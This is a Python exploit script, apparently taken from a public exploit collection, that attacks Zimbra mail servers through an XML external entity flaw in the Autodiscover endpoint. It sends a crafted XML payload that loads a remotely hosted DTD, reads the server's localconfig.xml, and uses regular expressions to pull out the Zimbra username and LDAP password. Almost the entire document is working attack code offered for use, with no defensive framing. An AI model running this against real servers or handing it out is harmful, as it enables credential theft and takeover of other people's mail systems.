##Local File Inclusion
##https://www.exploit-db.com/exploits/30085

#coding=utf8
import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

base_url="https://mail.test.com"
print(base_url)

#dtd file url
dtd_url="https://raw.githubusercontent.com/vulscanteam/include_lib_file/master/zimbra_XXE.txt"
"""
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
"""

xxe_data = r"""<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM "{dtd}">
        %dtd;
        %all;
        ]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>""".format(dtd=dtd_url)

#XXE stage
headers = {
    "Content-Type":"application/xml"
}
print("[*] Get User Name/Password By XXE ")
r = requests.post(base_url+"/Autodiscover/Autodiscover.xml",data=xxe_data,headers=headers,verify=False,timeout=15)

if 'response schema not available' not in r.text:
    print("have no xxe")
    exit()

pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
username = pattern_name.findall(r.text)[0][2]
password = pattern_password.findall(r.text)[0][2]
print(username)
print(password)
